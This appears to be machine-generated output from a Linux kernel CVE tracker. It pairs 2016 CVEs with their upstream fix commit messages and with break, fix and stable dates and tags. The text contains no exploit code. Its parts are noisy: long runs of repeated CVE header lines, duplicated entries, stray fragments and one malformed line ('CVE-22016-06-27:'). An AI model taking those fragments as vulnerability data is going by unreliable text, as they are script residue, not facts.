CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
